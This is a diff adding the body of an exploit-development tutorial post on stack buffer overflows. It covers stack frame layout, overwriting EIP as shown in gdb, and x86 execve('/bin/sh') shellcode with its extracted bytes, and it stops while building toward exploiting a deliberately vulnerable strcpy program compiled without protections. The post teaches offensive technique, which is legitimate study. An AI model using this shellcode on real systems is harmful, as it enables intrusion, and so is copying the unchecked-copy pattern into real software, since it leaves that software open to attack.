@@ -2,7 +2,7 @@
 <html lang="en-us">
   <head>
     <title>
-2. Linux Exploit Countermeasures and Bypasses | KernW0lf
+2. Linux Exploit Countermeasures and Bypasses (1) | KernW0lf
 </title>
 
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
@@ -99,7 +99,7 @@
       <div class="content">
         <main class="main">
 <div class="postWrapper">
-    <h1>2. Linux Exploit Countermeasures and Bypasses</h1>
+    <h1>2. Linux Exploit Countermeasures and Bypasses (1)</h1>
     
     
     <section class="postMetadata">
@@ -114,13 +114,501 @@
             
             
                 <dt>reading time</dt>
-                <dd>0 minutes</dd>
+                <dd>18 minutes</dd>
             
         </dl>
     </section>
     
     <div>
-        
+        <p>Before we dive into exploit countermeasures and bypasses, let’s quickly revisit the essentials of a stack overflow. In simple terms, stack overflows happen when we input more data than a program expects, causing it to spill over into other areas of memory. By controlling this overflow, we can manipulate the program’s execution.</p>
+<p>Let&rsquo;s dive deeper into understanding buffer overflows. A <em>buffer</em> is simply a designated space in memory used to store data, often a fixed-size region allocated for handling input or temporary data. When more data than the buffer’s size is written, it spills over into adjacent memory regions—a phenomenon we call <em>buffer overflow</em>.</p>
+<p>The following image illustrates the structure of a buffer and how it resides in memory:</p>
+<p><img src="/images/exp-dev/buffer.png" alt="buffer"></p>
+<p>In the illustration above, we have a character buffer defined as <code>char buff[5]</code>, meaning it holds 5 bytes. Each element of the buffer is 1 byte in size, so if the address of the first element is <code>0x100</code>, the second element will be at <code>0x101</code>, and so on, with the fifth element at <code>0x104</code>.</p>
+<p>Now, if we write more than 5 bytes into this buffer (like filling it with extra As), we begin to overwrite data at addresses immediately following <code>0x104</code>. This overflow is the beginning of potential unintended behavior, as data outside the buffer is altered—an introduction to buffer overflow mechanics.</p>
+<p>In the following code we will call a function which allocates space for buffer in its stack frame.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">newFun</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> pass[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ABCD&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,buff);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;pass :%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pass);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;buff :%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,buff);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">newFun</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This C program defines two local variables in <code>newFun()</code>: <code>pass</code> (a buffer of 8 bytes) and <code>buff</code> (a buffer of 4 bytes). scanf() reads user input into <code>buff</code>, and both buffers are printed afterward.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -z execstack -m32 -fno-stack-protector stack.c -o stack
+</span></span></code></pre></div><p>The disassembled code for <code>newFun()</code> looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>pwndbg&gt; disass newFun 
+</span></span><span style="display:flex;"><span>Dump of assembler code for function newFun:
+</span></span><span style="display:flex;"><span>   0x0000119d &lt;+0&gt;:	push   ebp
+</span></span><span style="display:flex;"><span>   0x0000119e &lt;+1&gt;:	mov    ebp,esp
+</span></span><span style="display:flex;"><span>   0x000011a0 &lt;+3&gt;:	push   ebx
+</span></span><span style="display:flex;"><span>   0x000011a1 &lt;+4&gt;:	sub    esp,0x14
+</span></span><span style="display:flex;"><span>   0x000011a4 &lt;+7&gt;:	call   0x10a0 &lt;__x86.get_pc_thunk.bx&gt;
+</span></span><span style="display:flex;"><span>   0x000011a9 &lt;+12&gt;:	add    ebx,0x2e4b
+</span></span><span style="display:flex;"><span>   0x000011af &lt;+18&gt;:	mov    DWORD PTR [ebp-0x10],0x44434241
+</span></span><span style="display:flex;"><span>   0x000011b6 &lt;+25&gt;:	mov    DWORD PTR [ebp-0xc],0x0
+</span></span><span style="display:flex;"><span>   0x000011bd &lt;+32&gt;:	sub    esp,0x8
+</span></span><span style="display:flex;"><span>   0x000011c0 &lt;+35&gt;:	lea    eax,[ebp-0x14]
+</span></span><span style="display:flex;"><span>   0x000011c3 &lt;+38&gt;:	push   eax
+</span></span><span style="display:flex;"><span>   0x000011c4 &lt;+39&gt;:	lea    eax,[ebx-0x1fec]
+</span></span><span style="display:flex;"><span>   0x000011ca &lt;+45&gt;:	push   eax
+</span></span><span style="display:flex;"><span>   0x000011cb &lt;+46&gt;:	call   0x1050 &lt;__isoc99_scanf@plt&gt;
+</span></span><span style="display:flex;"><span>   0x000011d0 &lt;+51&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x000011d3 &lt;+54&gt;:	sub    esp,0x8
+</span></span><span style="display:flex;"><span>   0x000011d6 &lt;+57&gt;:	lea    eax,[ebp-0x10]
+</span></span><span style="display:flex;"><span>   0x000011d9 &lt;+60&gt;:	push   eax
+</span></span><span style="display:flex;"><span>   0x000011da &lt;+61&gt;:	lea    eax,[ebx-0x1fe9]
+</span></span><span style="display:flex;"><span>   0x000011e0 &lt;+67&gt;:	push   eax
+</span></span><span style="display:flex;"><span>   0x000011e1 &lt;+68&gt;:	call   0x1040 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>   0x000011e6 &lt;+73&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x000011e9 &lt;+76&gt;:	sub    esp,0x8
+</span></span><span style="display:flex;"><span>   0x000011ec &lt;+79&gt;:	lea    eax,[ebp-0x14]
+</span></span><span style="display:flex;"><span>   0x000011ef &lt;+82&gt;:	push   eax
+</span></span><span style="display:flex;"><span>   0x000011f0 &lt;+83&gt;:	lea    eax,[ebx-0x1fdf]
+</span></span><span style="display:flex;"><span>   0x000011f6 &lt;+89&gt;:	push   eax
+</span></span><span style="display:flex;"><span>   0x000011f7 &lt;+90&gt;:	call   0x1040 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>   0x000011fc &lt;+95&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x000011ff &lt;+98&gt;:	nop
+</span></span><span style="display:flex;"><span>   0x00001200 &lt;+99&gt;:	mov    ebx,DWORD PTR [ebp-0x4]
+</span></span><span style="display:flex;"><span>   0x00001203 &lt;+102&gt;:	leave
+</span></span><span style="display:flex;"><span>   0x00001204 &lt;+103&gt;:	ret
+</span></span></code></pre></div><p><strong>Prologue and Epilogue in <code>newFun</code></strong>
+The <strong>prologue</strong> in <code>newFun()</code> prepares the function’s stack frame:</p>
+<ol>
+<li><code>push ebp</code> - Saves the previous frame’s base pointer.</li>
+<li><code>mov ebp, esp</code> - Sets <code>ebp</code> as the new base pointer.</li>
+<li><code>sub esp, 0x14</code> - Allocates space for local variables (<code>pass</code> and <code>buff</code>) by moving the stack pointer down.</li>
+</ol>
+<p>The <strong>epilogue</strong> restores the stack to its previous state and exits the function:</p>
+<ol>
+<li><code>leave</code> - Cleans up by restoring <code>ebp</code> and adjusting <code>esp</code>.</li>
+<li><code>ret</code> - Pops the saved return address from the stack into <code>eip</code>, returning control to the calling function.</li>
+</ol>
+<p>After space is allocated for the buffers <code>pass</code> and <code>buff</code> in <code>newFun()</code>, the <code>pass</code> buffer is initialized with <code>&quot;ABCD&quot;</code>. This data is stored in memory as <code>0x44434241</code>, where each byte represents one character in ASCII:</p>
+<ul>
+<li>0x41 for &lsquo;A&rsquo;</li>
+<li>0x42 for &lsquo;B&rsquo;</li>
+<li>0x43 for &lsquo;C&rsquo;</li>
+<li>0x44 for &lsquo;D&rsquo;</li>
+</ul>
+<p>In little-endian format, however, <code>0x44434241</code> is stored in reverse order in memory, appearing as <code>&quot;DCBA&quot;</code>.</p>
+<p>Afterward, at <code>ebp-0xc</code>, a <code>0x0</code> (null byte) is added, marking the end of the <code>pass</code> string. This ensures that any function interpreting <code>pass</code> will treat it as a null-terminated string, stopping at this byte.</p>
+<p>Since the stack grows downward, <code>pass</code> is allocated first at a higher memory address, followed by <code>buff</code> at a slightly lower address. Let’s examine how <code>pass</code> and <code>buff</code> are laid out in memory within the function’s stack frame:</p>
+<ul>
+<li><code>pass</code> is an 8-byte buffer starting at <code>ebp - 0x10</code> (16 bytes below the base pointer).</li>
+<li><code>buff</code> is a 4-byte buffer located just below pass, starting at <code>ebp - 0x14</code>.</li>
+</ul>
+<p>Here&rsquo;s what the stack frame layout might look like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>       Higher Addresses
+</span></span><span style="display:flex;"><span>       +------------------+  &lt;- Previous stack frame
+</span></span><span style="display:flex;"><span>       |    arguments     |  &lt;- Function arguments if any
+</span></span><span style="display:flex;"><span>       +------------------+
+</span></span><span style="display:flex;"><span>       | return address   |  &lt;- Address to return to main after newFun()
+</span></span><span style="display:flex;"><span>       +------------------+
+</span></span><span style="display:flex;"><span>       |      ebp         |  &lt;- Saved base pointer (old ebp)
+</span></span><span style="display:flex;"><span>       +------------------+
+</span></span><span style="display:flex;"><span>       |      ebx         |  &lt;- Saved ebx register
+</span></span><span style="display:flex;"><span>       +------------------+
+</span></span><span style="display:flex;"><span>       |   Some Junk      |  &lt;-  extra allocated space from `sub esp, 0x14` of 4 bytes
+</span></span><span style="display:flex;"><span>       +------------------+
+</span></span><span style="display:flex;"><span>       | pass[8] (&#34;ABCD&#34;) |  &lt;- char pass[8] (stored as `0x44434241`)
+</span></span><span style="display:flex;"><span>       +------------------+
+</span></span><span style="display:flex;"><span>       |      buff[4]     |  &lt;- char buff[4]
+</span></span><span style="display:flex;"><span>       +------------------+
+</span></span><span style="display:flex;"><span>       |   Local vars     |  
+</span></span><span style="display:flex;"><span>       |      ....        |
+</span></span><span style="display:flex;"><span>       +------------------+  &lt;- esp (top of stack)
+</span></span><span style="display:flex;"><span>       Lower Addresses
+</span></span></code></pre></div><p>In this example, let&rsquo;s examine how overflowing the <code>buff</code> buffer impacts other variables in memory.</p>
+<p>When we provide an input like <code>&quot;XXXX&quot;</code>, this will perfectly fill the <code>buff</code> buffer without overflowing into neighboring memory. However, if we add one more character, such as <code>&quot;XXXXD&quot;</code>, this extra character will start to overwrite the adjacent <code>pass</code> buffer, specifically the first byte that currently holds &lsquo;A&rsquo;. Let&rsquo;s see what happens when we use <code>&quot;XXXXDEAD&quot;</code> as our input.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./stack 
+</span></span><span style="display:flex;"><span>XXXXDEAD
+</span></span><span style="display:flex;"><span>pass :DEAD
+</span></span><span style="display:flex;"><span>buff :XXXXDEAD
+</span></span></code></pre></div><p>As we see in the output, we’ve successfully overwritten the <code>pass</code> buffer with our input data. By examining the stack frame layout, we can determine that the <code>pass</code> buffer has a size of 8 bytes. If we exceed these 8 bytes, the following bytes in our input will start to overwrite saved registers like <code>EBX</code> and <code>EBP</code>.</p>
+<p>Let’s try to overwrite several specific locations in the stack. We’ll structure our input as follows:</p>
+<p><code>AAAA</code> (fills buff)
+<code>BBBBBBBB</code> (fills pass)
+<code>CCCC</code> (fills the extra 4-byte junk area)
+<code>CAFE</code> (to overwrite EBX)
+<code>BABE</code> (to overwrite EBP)
+<code>DEAD</code> (which will overwrite the return address, and therefore EIP)</p>
+<p>After overwriting EBP, we directly target the return address pushed onto the stack before the function prologue, which will be loaded into EIP by the ret instruction.</p>
+<p>By structuring our input this way, we can observe how a carefully crafted buffer overflow affects program flow.</p>
+<p>To observe the effects of our input, let’s run the program and examine the output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./stack 
+</span></span><span style="display:flex;"><span>AAAABBBBBBBBCCCCCAFEBABEDEAD
+</span></span><span style="display:flex;"><span>pass :BBBBBBBBCCCCCAFEBABEDEAD
+</span></span><span style="display:flex;"><span>buff :AAAABBBBBBBBCCCCCAFEBABEDEAD
+</span></span><span style="display:flex;"><span>Segmentation fault
+</span></span></code></pre></div><p>To dive deeper, let’s enable core dump generation to capture the program&rsquo;s state at the moment of the crash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ulimit -c unlimited
+</span></span><span style="display:flex;"><span>$ ./stack 
+</span></span><span style="display:flex;"><span>AAAABBBBBBBBCCCCCAFEBABEDEAD
+</span></span><span style="display:flex;"><span>pass :BBBBBBBBCCCCCAFEBABEDEAD
+</span></span><span style="display:flex;"><span>buff :AAAABBBBBBBBCCCCCAFEBABEDEAD
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>With the core dump generated, we can analyze it using <code>gdb</code> to confirm if our input successfully overwrote critical parts of the stack, including <code>EBX</code>, <code>EBP</code>, and <code>EIP</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -core core
+</span></span><span style="display:flex;"><span>Core was generated by <span style="color:#e6db74">`</span>./stack<span style="color:#e6db74">&#39;.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Program terminated with signal SIGSEGV, Segmentation fault.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#0  0x44414544 in ?? ()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">──────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EAX  0x23
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EBX  0x45464143 (&#39;</span>CAFE<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ECX  0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EDX  0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EDI  0xf7f55b60 ◂— 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ESI  0xffdf331c —▸ 0xffdf4934 ◂— &#39;</span>SHELL<span style="color:#f92672">=</span>/usr/bin/bash<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EBP  0x45424142 (&#39;</span>BABE<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ESP  0xffdf3250 ◂— 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EIP  0x44414544 (&#39;</span>DEAD<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x44414544
+</span></span></code></pre></div><p>The output shows that:</p>
+<ul>
+<li><code>EBX</code> has been overwritten with 0x45464143 (&ldquo;CAFE&rdquo;).</li>
+<li><code>EBP</code> has been overwritten with 0x45424142 (&ldquo;BABE&rdquo;).</li>
+<li><code>EIP</code> has been overwritten with 0x44414544 (&ldquo;DEAD&rdquo;).</li>
+</ul>
+<p>The diagram below, created by me, will help clarify the concepts discussed. 😊</p>
+<p><img src="/images/exp-dev/buffer-overflow.png" alt="buffer-overflow"></p>
+<p>Now that you have a solid understanding of buffer overflow, let’s shift our focus away from using the <code>win</code> function, as we did in the previous section of this series. We will briefly explore the concept of shellcode. A more in-depth explanation of shellcode will be provided in a later part of this series.</p>
+<h3 id="shellcode-101">Shellcode 101</h3>
+<p>Shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is typically written in assembly language and is designed to execute a specific function when injected into a running process. Shellcode gets its name because it often spawns a command shell, allowing an attacker to execute arbitrary commands on the compromised system.</p>
+<p><strong>Types of Shellcode</strong></p>
+<ul>
+<li>Local Shellcode: This type of shellcode is executed on the local machine and is typically used to gain shell access without requiring network communication.</li>
+<li>Remote Shellcode: Remote shellcode is designed to connect to an attacker&rsquo;s machine over the network, providing the attacker with a remote command shell.</li>
+<li>Bind Shellcode: This shellcode binds a shell to a specific port on the target machine, allowing the attacker to connect to it remotely.</li>
+<li>Reverse Shellcode: In contrast to bind shellcode, reverse shellcode initiates a connection back to the attacker&rsquo;s machine, which is listening on a specific port for incoming connections.</li>
+</ul>
+<p>This is how x86 assembly code for <code>execve(&quot;/bin/sh&quot;)</code> looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-s" data-lang="s"><span style="display:flex;"><span>section .text
+</span></span><span style="display:flex;"><span>global _start
+</span></span><span style="display:flex;"><span>_start<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    xor ecx,ecx
+</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0xb</span>
+</span></span><span style="display:flex;"><span>    pop eax
+</span></span><span style="display:flex;"><span>    push ecx
+</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x68732f2f</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x6e69622f</span>
+</span></span><span style="display:flex;"><span>    mov ebx,esp
+</span></span><span style="display:flex;"><span>    int <span style="color:#ae81ff">0x80</span>
+</span></span></code></pre></div><p>I understand this can be a bit challenging, but we will cover writing shellcode in more detail in a later section. For now, let&rsquo;s focus on assembling and linking the shellcode to check if it runs correctly on your system.</p>
+<p>Here’s how to do it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt update 
+</span></span><span style="display:flex;"><span>$ sudo apt install nasm
+</span></span><span style="display:flex;"><span>$ nasm -f elf32 shell.s -o shell.o
+</span></span><span style="display:flex;"><span>$ ld -m elf_i386 shell.o -o shell
+</span></span><span style="display:flex;"><span>$ ./shell
+</span></span><span style="display:flex;"><span>$ 
+</span></span></code></pre></div><p>After executing the last command, a <code>/bin/sh</code> shell should open on your system.</p>
+<p><strong>Extracting Shellcode</strong></p>
+<p>Once you have successfully executed the shellcode and opened a shell, you might want to extract the raw shellcode bytes for further use or experimentation. Here&rsquo;s a simple way to extract the shellcode from the executable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ objdump -M intel -d shell 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shell:     file format elf32-i386
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Disassembly of section .text:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049000</span> &lt;_start&gt;:
+</span></span><span style="display:flex;"><span> 8049000:	<span style="color:#ae81ff">31</span> c9                	xor    ecx,ecx
+</span></span><span style="display:flex;"><span> 8049002:	6a 0b                	push   0xb
+</span></span><span style="display:flex;"><span> 8049004:	<span style="color:#ae81ff">58</span>                   	pop    eax
+</span></span><span style="display:flex;"><span> 8049005:	<span style="color:#ae81ff">51</span>                   	push   ecx
+</span></span><span style="display:flex;"><span> 8049006:	<span style="color:#ae81ff">68</span> 2f 2f <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">68</span>       	push   0x68732f2f
+</span></span><span style="display:flex;"><span> 804900b:	<span style="color:#ae81ff">68</span> 2f <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">69</span> 6e       	push   0x6e69622f
+</span></span><span style="display:flex;"><span> 8049010:	<span style="color:#ae81ff">89</span> e3                	mov    ebx,esp
+</span></span><span style="display:flex;"><span> 8049012:	cd <span style="color:#ae81ff">80</span>                	int    0x80
+</span></span></code></pre></div><p>The shellcode for executing a <code>/bin/sh</code> will be:
+<code>&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</code>.</p>
+<p>To automate the extraction of shellcode from the binary, you can use the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ objdump -d ./shell | grep <span style="color:#e6db74">&#39;[0-9a-f]:&#39;</span> | grep -v <span style="color:#e6db74">&#39;file&#39;</span> | cut -f2 -d: | cut -f1-6 -d<span style="color:#e6db74">&#39; &#39;</span> | tr -s <span style="color:#e6db74">&#39; &#39;</span> | tr <span style="color:#e6db74">&#39;\t&#39;</span> <span style="color:#e6db74">&#39; &#39;</span> | sed <span style="color:#e6db74">&#39;s/ $//g&#39;</span> | sed <span style="color:#e6db74">&#39;s/ /\\x/g&#39;</span> | paste -d <span style="color:#e6db74">&#39;&#39;</span> -s | sed <span style="color:#e6db74">&#39;s/^/&#34;/&#39;</span> | sed <span style="color:#e6db74">&#39;s/$/&#34;/&#39;</span>
+</span></span></code></pre></div><p><strong>Understanding NOPs (No Operation Instructions)</strong></p>
+<p>In assembly language, a NOP (No Operation) instruction is a single-byte instruction that does nothing when executed. Its primary purpose is to create a delay or to align code, but in the context of shellcoding and exploitation, NOPs serve a crucial role. NOPs are often used in what is known as a &ldquo;NOP sled&rdquo; or &ldquo;NOP slide.&rdquo; This technique helps increase the chances of successfully hitting the shellcode during an exploit. By placing multiple NOP instructions before the shellcode in memory, you create a larger area of executable code that the processor can reach. When an attacker overwrites the return address to point to a NOP sled, they can land anywhere within that range and still eventually reach the shellcode.</p>
+<p>For the x86 architecture, the NOP instruction is represented by the byte <code>0x90</code>. When included in an exploit or shellcode, 0x90 instructs the processor to do nothing, effectively allowing the program to slide through it until it reaches the intended executable code, such as shellcode.</p>
+<p>So that was a quick overview of shellcode! Now, let&rsquo;s dive into how we can redirect our program&rsquo;s flow to execute that shellcode! 😈💥</p>
+<hr>
+<p>Let&rsquo;s take a look at the following vulnerable program, <code>exp1.c</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// gcc -m32 -z execstack -fno-stack-protector exp1.c -o exp1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">50</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(buff,s);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vuln</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This program accepts an input argument (<code>argv[1]</code>) and copies it into a fixed-size buffer of 50 bytes using the <code>strcpy</code> function. However, it doesn&rsquo;t perform any bounds checking, making it vulnerable to buffer overflow attacks.</p>
+<p><strong>Testing the Vulnerability 💥</strong></p>
+<p>Let’s test the program by passing in a string of 100 &lsquo;A&rsquo;s:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exp1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>Segmentation fault
+</span></span></code></pre></div><p>As you can see, the program crashed with a segmentation fault. To analyze this crash, we can enable core dump generation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ulimit -c unlimited 
+</span></span></code></pre></div><p><strong>Analyzing the Core Dump 🕵️‍♂️</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  <span style="color:#ae81ff">02</span> ./exp1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ gdb -core core
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>──────────────────<span style="color:#f92672">[</span> REGISTERS / show-flags off / show-compact-regs off <span style="color:#f92672">]</span>──────────────────
+</span></span><span style="display:flex;"><span> EAX  0xfff3955e ◂— <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
+</span></span><span style="display:flex;"><span> EBX  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ECX  0xfff3a8e0 ◂— 0x414141 /* <span style="color:#e6db74">&#39;AAA&#39;</span> */
+</span></span><span style="display:flex;"><span> EDX  0xfff395bf ◂— 0x414141 /* <span style="color:#e6db74">&#39;AAA&#39;</span> */
+</span></span><span style="display:flex;"><span> EDI  0xf7f27b60 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> ESI  0xfff39690 —▸ 0xfff3a8e4 ◂— <span style="color:#e6db74">&#39;SHELL=/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span> EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ESP  0xfff395a0 ◂— <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
+</span></span><span style="display:flex;"><span> EIP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x41414141
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Notably, the EIP (Extended Instruction Pointer) has been overwritten with &ldquo;AAAA,&rdquo; indicating that we can control the program&rsquo;s execution flow! 🕹️</p>
+<p><strong>Generating a Cyclic Pattern 🔄</strong></p>
+<p>Let&rsquo;s generate a cyclic pattern consisting of 100 characters to help us determine the offset.</p>
